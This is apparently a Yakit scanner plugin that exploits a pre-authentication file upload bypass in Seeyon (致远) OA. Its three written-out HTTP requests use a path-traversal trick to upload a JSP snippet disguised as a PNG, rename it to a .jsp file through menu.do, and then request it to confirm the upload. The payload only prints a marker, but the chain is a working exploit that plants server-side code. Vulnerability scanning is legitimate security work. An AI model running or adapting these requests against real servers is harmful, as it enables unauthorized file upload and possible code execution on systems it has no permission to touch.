script_name: 致远 OA fileUpload.do 前台文件上传绕过漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
Host: {{params(target)}}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: multipart/form-data; boundary=skdHHhNHjhnUgerSexsksboundary
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)

--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="type"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="extensions"

png
--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="applicationCategory"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="destDirectory"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="destFilename"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="maxSize"


--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="isEncrypt"

false
--skdHHhNHjhnUgerSexsksboundary
Content-Disposition: form-data; name="file1"; filename="1.png"
Content-Type: Content-Type: application/pdf

<% out.println("hello f.0.f");%>
--skdHHhNHjhnUgerSexsksboundary--`

	packet2 = `POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
Host: {{params(target)}}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)

method=uploadMenuIcon&fileid={{params(fileid)}}&filename=testqqww.jsp`

	packet3 = `GET /seeyon/main/menuIcon/testqqww.jsp HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

`
    rsp,req,_ = poc.HTTP(packet1, 
    	poc.params({"target":addr}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )
    if !(len(rsp) > 1000) {
		return
	}

	field = re.FindSubmatch(rsp, `fileurls=fileurls\+\","\+'(\d+)';`)
    if len(field) == 0 {
        return 
    }

	rsp1,req1,_ = poc.HTTPEx(packet2, 
		poc.params({"target":addr,"fileid":field[1]}),
		poc.https(isTls),
		poc.redirectTimes(0),
	)

	if rsp1.GetStatusCode() != 200 {
		return
	}

	rsp2,req2,_ = poc.HTTPEx(packet3, 
		poc.params({"target":addr}),
		poc.https(isTls),
		poc.redirectTimes(0),
		)
	if rsp2.GetStatusCode() != 200 {
		return
	}


	yakit.Info("%v found 致远 OA fileUpload.do 前台文件上传绕过漏洞", addr)
		risk.NewRisk(
		addr,
		risk.title("致远 OA fileUpload.do 前台文件上传绕过漏洞"),
		risk.severity("high"),
        risk.type("file-upload"),
		risk.titleVerbose("致远 OA fileUpload.do 前台文件上传绕过漏洞"),
		risk.request(string(req2)),
		risk.response(string(rsp2)),
		risk.cve("no cve"),
		risk.details( " 尝试访问 ： "+ addr + "/seeyon/main/menuIcon/testqqww.jsp")
    	)

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
